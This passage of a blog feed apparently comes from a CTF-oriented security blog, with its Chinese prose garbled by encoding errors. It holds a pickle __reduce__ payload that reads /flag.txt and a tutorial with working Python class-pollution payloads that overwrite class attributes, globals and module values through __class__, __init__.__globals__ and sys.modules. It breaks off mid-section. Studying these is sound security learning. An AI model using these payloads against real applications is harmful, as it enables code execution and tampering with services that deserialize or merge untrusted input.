src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160938342.png" alt="image-20240229160938342"></p><p>è¯»å–flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;rb&#x27;).read()&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229161110656.png" alt="image-20240229161110656"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pickleååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#pickleååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;pickleååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;pickleååºåˆ—åŒ–&lt;/h1&gt;&lt;p&gt;åœ¨pyhtonä¸­ä¹Ÿå­˜åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ“ä½œ, ç”±pickleæ¨¡å—å®ç°&lt;/p</summary>
      
    
    
    
    
    <category term="pickleååºåˆ—åŒ–" scheme="http://example.com/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)</title>
    <link href="http://example.com/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    <id>http://example.com/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/</id>
    <published>2024-02-27T15:24:04.000Z</published>
    <updated>2024-02-29T14:43:35.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“"><a href="#Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“" class="headerlink" title="Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)"></a>Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)</h1><p>ä¸JavaScriptåŸå‹é“¾æ±¡æŸ“ç±»ä¼¼, pythonä¹Ÿå­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„é—®é¢˜</p><p>ä¸åŒçš„æ˜¯, pythonçš„åŸå‹é“¾æ±¡æŸ“å…¶å®æ˜¯ç±»æ±¡æŸ“, å¹¶ä¸”__åªèƒ½æ±¡æŸ“ä¸€äº›ç±»å±æ€§, è€Œå¯¹ç±»æ–¹æ³•æ— æ•ˆ__</p><p>ä¹‹å‰å­¦ä¹ sstiæ˜¯å°±çŸ¥é“ pythonå¯ä»¥é€šè¿‡ä¸€äº›é­”æœ¯æ–¹æ³•,ç±»æ–¹æ³•,ç±»å±æ€§å±‚å±‚è®¿é—®,ç›´åˆ°è°ƒç”¨åˆ°ä¸€äº›å±é™©å‡½æ•°</p><p>å› æ­¤pythonä¹Ÿå­˜åœ¨é“¾å¼è®¿é—®,æ›´æ”¹å±æ€§ç­‰é—®é¢˜</p><h2 id="mergeå‡½æ•°"><a href="#mergeå‡½æ•°" class="headerlink" title="mergeå‡½æ•°"></a>mergeå‡½æ•°</h2><p>åœ¨Javascriptä¸­, æœ€ä¸ºå¸¸è§çš„å°±æ˜¯å±æ€§åˆå¹¶å‡½æ•°(merge)é€ æˆçš„åŸå‹é“¾æ±¡æŸ“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±é€ æˆäº†é”®å€¼å¯¹å¯æ§,ä½¿å¾—å¯ä»¥å¯¹çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•è¿›è¡Œæ±¡æŸ“ä¿®æ”¹</p><p>åœ¨pythonä¸­, ä¹Ÿå­˜åœ¨è¿™æ ·çš„mergeå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment"># è‹¥vä»ç„¶æ˜¯ä¸€ä¸ªå­—å…¸, é€’å½’åœ°å°†å…¶å¤åˆ¶åˆ°dstä¸­</span></span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)<span class="comment"># å°†srcä¸‹çš„k væ·»åŠ åˆ°dstä¸­</span></span><br></pre></td></tr></table></figure><h2 id="æ±¡æŸ“ä¾‹å­"><a href="#æ±¡æŸ“ä¾‹å­" class="headerlink" title="æ±¡æŸ“ä¾‹å­"></a>æ±¡æŸ“ä¾‹å­</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="built_in">print</span>(tmp.secret)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#è¾“å‡º</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># world</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œé€šè¿‡tmp.__class__.__base__å°†å…¶çˆ¶ç±»(fatherç±»)ä¸‹çš„secretå±æ€§æ›´æ”¹é€ æˆæ±¡æŸ“</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„, é€šè¿‡è¿™ç§æ–¹æ³•å¯ä»¥ä¿®æ”¹pythonçš„å†…ç½®å±æ€§</p><blockquote><p><code>__str__</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼ˆç‰¹æ®Šæ–¹æ³•ä¹Ÿç§°ä¸ºé­”æ³•æ–¹æ³•æˆ–é­”æœ¯æ–¹æ³•ï¼‰ä¹‹ä¸€ï¼Œåœ¨ Python ç±»ä¸­ç”¨äºå®šä¹‰å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚å½“ä½ è°ƒç”¨å†…ç½®çš„ <code>str()</code> å‡½æ•°æˆ– <code>print()</code> å‡½æ•°æ¥æ˜¾ç¤ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†è¯¥å¯¹è±¡çš„ <code>__str__</code> æ–¹æ³•ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;father&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># è¾“å‡º</span></span><br><span class="line"><span class="comment"># father</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><h2 id="æ— æ³•æ±¡æŸ“çš„objectå±æ€§"><a href="#æ— æ³•æ±¡æŸ“çš„objectå±æ€§" class="headerlink" title="æ— æ³•æ±¡æŸ“çš„objectå±æ€§"></a>æ— æ³•æ±¡æŸ“çš„objectå±æ€§</h2><p>å°è¯•æ±¡æŸ“Objectå±æ€§æ—¶, å°†ä¼šæç¤ºé”™è¯¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;pollution!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># TypeError: cannot set &#x27;__str__&#x27; attribute of immutable type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="å…¨å±€å˜é‡è·å–"><a href="#å…¨å±€å˜é‡è·å–" class="headerlink" title="å…¨å±€å˜é‡è·å–"></a>å…¨å±€å˜é‡è·å–</h2><blockquote><p>åœ¨<code>Python</code>ä¸­ï¼Œå‡½æ•°æˆ–ç±»æ–¹æ³•ï¼ˆå¯¹äºç±»çš„å†…ç½®æ–¹æ³•å¦‚<code>__init__</code>è¿™äº›æ¥è¯´ï¼Œå†…ç½®æ–¹æ³•åœ¨å¹¶æœªé‡å†™æ—¶å…¶æ•°æ®ç±»å‹ä¸ºè£…é¥°å™¨å³<code>wrapper_descriptor</code>ï¼Œåªæœ‰åœ¨é‡å†™åæ‰æ˜¯å‡½æ•°<code>function</code>ï¼‰å‡å…·æœ‰ä¸€ä¸ª<code>__globals__</code>å±æ€§ï¼Œè¯¥å±æ€§å°†å‡½æ•°æˆ–ç±»æ–¹æ³•æ‰€ç”³æ˜çš„å˜é‡ç©ºé—´ä¸­çš„å…¨å±€å˜é‡ä»¥å­—å…¸çš„å½¢å¼è¿”å›ï¼ˆç›¸å½“äºè¿™ä¸ªå˜é‡ç©ºé—´ä¸­çš„<code>globals</code>å‡½æ•°çš„è¿”å›å€¼</p></blockquote><p><strong>_<em>globals</em>_</strong></p><blockquote><p><code>__globals__</code> æ˜¯ Python å‡½æ•°å¯¹è±¡ï¼ˆfunction objectï¼‰çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºè·å–å‡½æ•°å®šä¹‰æ—¶æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´ï¼ˆglobal namespaceï¼‰ã€‚è¯¥å±æ€§è¿”å›ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºå‡½æ•°åœ¨å®šä¹‰æ—¶çš„å…¨å±€å‘½åç©ºé—´ä¸­çš„ç¬¦å·è¡¨ï¼ˆsymbol tableï¼‰ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    target_secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line">instence = test()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">            <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;target_secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"></span><br><span class="line">merge(payload, instence)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"><span class="comment"># è¾“å‡º</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ²¡æœ‰ç»§æ‰¿å…³ç³»çš„ç±»å±æ€§ä¹Ÿè¢«æ±¡æŸ“äº†</p><h2 id="å·²åŠ è½½æ¨¡å—è·å–"><a href="#å·²åŠ è½½æ¨¡å—è·å–" class="headerlink" title="å·²åŠ è½½æ¨¡å—è·å–"></a>å·²åŠ è½½æ¨¡å—è·å–</h2><p>test_1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;hahaha&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello, world!&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">tmp = a()</span><br><span class="line">merge(payload, a)</span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line"><span class="comment">#  è¾“å‡º</span></span><br><span class="line"><span class="comment"># hahaha</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å·²ç»åŠ è½½çš„æ¨¡å—ä¹Ÿä¼šè¢«æ±¡æŸ“</p><h2 id="æ¨¡å—åŠ è½½å…³ç³»å¤æ‚"><a href="#æ¨¡å—åŠ è½½å…³ç³»å¤æ‚" class="headerlink" title="æ¨¡å—åŠ è½½å…³ç³»å¤æ‚"></a>æ¨¡å—åŠ è½½å…³ç³»å¤æ‚</h2><blockquote><p><code>sys</code>æ¨¡å—çš„<code>modules</code>å±æ€§ä»¥å­—å…¸çš„å½¢å¼åŒ…å«äº†ç¨‹åºè‡ªå¼€å§‹è¿è¡Œæ—¶æ‰€æœ‰å·²åŠ è½½è¿‡çš„æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ä»è¯¥å±æ€§ä¸­è·å–åˆ°ç›®æ ‡æ¨¡å—</p></blockquote><p>åœ¨<code>import sys</code>çš„ç¨‹åºä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹payloadåœ¨å¤æ‚çš„æ¨¡å—å¯¼å…¥å…³ç³»ä¸­æ‰¾åˆ°ç›®æ ‡æ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“"><a href="#å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“" class="headerlink" title="å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“"></a>å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“</h2><p>ä¸»è¦ç”¨åˆ°<code>__defaults__å’Œ__kwdefaults__</code>ä¸¤ä¸ªå†…ç½®å±æ€§</p><h3 id="defaults"><a href="#defaults" class="headerlink" title="__defaults__"></a><code>__defaults__</code></h3><blockquote><p><code>__defaults__</code>ä»¥å…ƒç»„çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°çš„ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼å³å£°æ˜åœ¨ &#x2F; å * å‰çš„å‚æ•°é»˜è®¤å€¼ï¼Œéœ€è¦æ³¨æ„è¿™ä¸ªä½ç½®æˆ–é”®å€¼å½¢å‚æ˜¯ç‰¹å®šçš„ä¸€ç±»å½¢å‚ï¼Œå¹¶ä¸æ˜¯ä½ç½®å½¢å‚+é”®å€¼å½¢å‚</p></blockquote><h3 id="kwdefaults"><a href="#kwdefaults" class="headerlink" 